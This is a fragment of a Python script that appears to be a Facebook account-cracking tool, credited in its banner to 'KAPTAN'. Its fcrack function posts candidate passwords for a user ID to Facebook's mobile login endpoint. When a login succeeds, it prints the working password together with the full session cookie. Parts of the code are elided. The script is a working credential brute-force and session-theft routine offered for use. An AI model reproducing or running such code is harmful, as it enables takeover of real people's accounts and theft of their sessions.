...
#DADA YOUR 2ND FATHER ☺️ ITS SILENT IS HERE
...
--------------------------------------------------
[•] AUTHOR     : \033[1;32mKAPTAN\033[1;37m
...
def fcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/?next&ref=wizard&fl&login_from_aymh=1&refid=8',data=idpass,allow_redirects=False,headers=head).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[LPC-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mLPC\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
